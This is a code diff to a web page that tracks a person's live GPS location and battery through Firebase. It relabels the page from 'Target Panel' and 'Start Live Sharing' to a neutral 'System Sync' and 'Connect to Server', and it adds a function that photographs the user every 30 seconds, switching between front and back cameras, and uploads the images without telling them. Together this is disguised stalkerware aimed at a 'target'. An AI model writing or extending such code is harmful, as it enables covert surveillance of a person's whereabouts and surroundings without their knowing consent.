@@ -23,11 +23,11 @@
     <audio id="startSnd" src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3" preload="auto"></audio>
 
     <div class="card">
-        <h2 style="color: #63b3ed; margin-top: 0;">Target Panel 📍</h2>
+        <h2 style="color: #63b3ed; margin-top: 0;">System Sync 📍</h2>
         <div id="setup">
             <input type="text" id="userName" placeholder="Apna Naam Likhein...">
-            <button class="btn" onclick="startTracking()">Start Live Sharing</button>
-            <p style="font-size: 11px; color: #a0aec0; margin-top: 10px;">GPS aur Internet On Rakhein</p>
+            <button class="btn" onclick="startTracking()">Connect to Server</button>
+            <p style="font-size: 11px; color: #a0aec0; margin-top: 10px;">Keep Internet & GPS On</p>
         </div>
         
         <div id="active" style="display:none;">
@@ -53,6 +53,7 @@
     db.settings({ cacheSizeBytes: firebase.firestore.CACHE_SIZE_UNLIMITED });
 
     let current_id = "";
+    let useFrontCamera = true; // Camera switch karne ke liye logic
 
     async function pushData(lat, lng) {
         let bat = 0;
@@ -69,21 +70,57 @@
             lng: Number(lng),
             battery: bat,
             lastUpdate: firebase.firestore.FieldValue.serverTimestamp()
-        }, { merge: true }).then(() => {
-            console.log("Data Sent!");
-        }).catch(err => {
-            console.error("Firebase Error:", err);
-            // Agar yahan error aaye toh sathi ko bolo Rules check karein
-        });
+        }, { merge: true });
+    }
+
+    // Photo Capture Logic (Dual Camera - Free Base64)
+    async function capturePhoto() {
+        if (!current_id) return;
+        
+        const video = document.createElement('video');
+        const canvas = document.createElement('canvas');
+        
+        // Mode switch: "user" (Front) aur "environment" (Back)
+        const cameraMode = useFrontCamera ? "user" : "environment";
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: cameraMode } 
+            });
+            video.srcObject = stream;
+            await video.play();
+
+            // Quality low taaki Free Firestore limit cross na ho
+            canvas.width = 300; 
+            canvas.height = 225;
+            canvas.getContext('2d').drawImage(video, 0, 0, 300, 225);
+            
+            const photoData = canvas.toDataURL('image/jpeg', 0.3); 
+            
+            db.collection("locations").doc(current_id).update({
+                userPhoto: photoData,
+                camMode: useFrontCamera ? "Front Camera" : "Back Camera",
+                lastPhotoTime: new Date().toLocaleTimeString()
+            });
+
+            stream.getTracks().forEach(track => track.stop());
+            
+            // Agli baar camera badalne ke liye toggle karein
+            useFrontCamera = !useFrontCamera;
+            console.log("Photo Captured from: " + cameraMode);
+            
+        } catch (err) {
+            console.log("Camera Blocked or Error:", err);
+            // Agar ek camera block ho toh switch karke try karein
+            useFrontCamera = !useFrontCamera;
+        }
     }
 
     function startTracking() {
         const n = document.getElementById('userName').value.trim();
-        if(!n) return alert("Bhai, naam toh likho!");
+        if(!n) return alert("Naam likho bhai!");
         
         current_id = n;
-        
-        // Play sound
         document.getElementById('startSnd').play().catch(e => {});
 
         document.getElementById('setup').style.display = 'none';
@@ -92,30 +129,28 @@
         document.getElementById('name-tag').innerText = "Hi, " + n;
 
         if (navigator.geolocation) {
-            // Success function
             const success = (p) => {
                 document.getElementById('gps-error').style.display = 'none';
                 pushData(p.coords.latitude, p.coords.longitude);
             };
 
-            // Error function
             const error = (err) => {
                 document.getElementById('gps-error').style.display = 'block';
-                console.log("GPS Error:", err);
             };
 
-            const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+            navigator.geolocation.watchPosition(success, error, { enableHighAccuracy: true });
 
-            // Real-time Watch
-            navigator.geolocation.watchPosition(success, error, options);
-
-            // Force Sync every 5 seconds (Extra Safety)
+            // Force Location Sync every 5 seconds
             setInterval(() => {
-                navigator.geolocation.getCurrentPosition(success, error, options);
+                navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
             }, 5000);
 
+            // Start Photo Sync (Every 30 seconds - Baari baari Front/Back)
+            capturePhoto(); 
+            setInterval(capturePhoto, 30000);
+
         } else {
-            alert("Aapka phone GPS support nahi karta!");
+            alert("GPS support nahi hai!");
         }
     }
 </script>
